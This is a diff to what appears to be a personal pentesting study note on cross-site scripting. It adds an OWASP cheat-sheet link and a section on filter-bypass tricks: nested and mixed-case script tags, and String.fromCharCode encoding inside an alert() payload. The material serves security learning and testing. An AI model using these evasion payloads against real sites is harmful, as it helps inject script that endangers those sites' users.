@@ -17,7 +17,7 @@ tag: pentesting, webpentesting
 # 3. Test with HTML/JavaScript code (alert('XSS'))
 ```
 
-But, of course, you may use an extensive repository of payloads.
+But, of course, you may use an extensive repository of payloads. This [OWASP cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) is kind of a bible.
 
 
 ## Cross-Site Scripting XSS: reflected, persistent or DOM based
@@ -119,6 +119,26 @@ Which sinks can lead to DOM-XSS vulnerabilities:
 - element.outerHTML 
 - element.insertAdjacentHTML 
 - element.onevent
+
+
+## Bypassing techniques
+
+```
+# Using uppercase and lowercase
+
+# If first <script is removed, insert one script into another:
+<scr<script>ipt>
+
+# It single quotation (or even double quotes) is removed, you can use the function String.fromCharCode(number, number, number, number)
+# 1. We lookk for a charcode calculator and enter our payload, for instance "lala" will be: 
+34, 108, 97, 108, 97, 34
+# 2. Them we put those numbers in our payload
+<scRIpt>alert(String.fromCharCode(34, 108, 97, 108, 97, 34))</sCRiPt>
+
+```
+
+
+
 
 ## Tools and payloads
 
